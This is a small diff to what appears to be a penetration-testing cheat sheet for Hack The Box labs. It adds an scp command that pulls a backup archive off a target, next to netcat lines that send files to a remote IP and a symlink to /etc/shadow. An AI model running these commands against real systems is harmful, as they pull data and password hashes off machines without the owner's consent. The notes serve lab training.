@@ -229,6 +229,9 @@ systemctl enable service_name
 ncat -l -p 9000 > received_file.pdf
 nc -q 0 10.10.10.10 9000 < 'sent_file.pdf'
 
+# Copying a file from target if SSH is possible
+scp user@machine.htb:/var/backups/backup.tar.gz backup.tar.gz
+
 # Creating a shadow link
 ln -s /etc/shadow /home/user/shadow_link
 
